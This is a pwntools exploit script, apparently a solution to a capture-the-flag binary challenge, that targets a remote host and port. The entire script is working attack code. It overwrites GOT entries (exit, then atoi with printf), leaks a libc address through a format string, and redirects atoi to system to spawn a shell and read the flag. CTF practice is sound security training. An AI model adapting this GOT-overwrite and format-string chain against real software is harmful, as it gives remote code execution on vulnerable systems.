#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")

# shortcuts
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

host, port = "65.21.255.31", "33710"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

# replace exit got entry by _start, to restart at exit
sla('size: ', '9$'.ljust(8,b'\x00')+p64(exe.got['exit'])[0:5])
payload = p64(exe.sym['_start'])[0:6]
sla('data: ', payload)
# replace atoi got entry by printf
sla('size: ', '9$'.ljust(8,b'\x00')+p64(exe.got['atoi'])[0:5])
payload = p64(exe.sym['printf'])[0:6]
sla('data: ', payload)
# leak libc address with atoi/printf
sla('size: ', '1%13$p')
libc.address = int(rcu('1', 'data: '),16) - 0x24083
print('libc base = '+hex(libc.address))
sl('a')
# replace atoi by system
sla('size: ', '9$'.ljust(8,b'\x00')+p64(exe.got['atoi'])[0:5])
payload = p64(libc.sym['system'])[0:6]
sla('data: ', payload)
# execute sh and got shell
sla('size: ', '1;sh')
sl('id;cat flag*')

p.interactive()


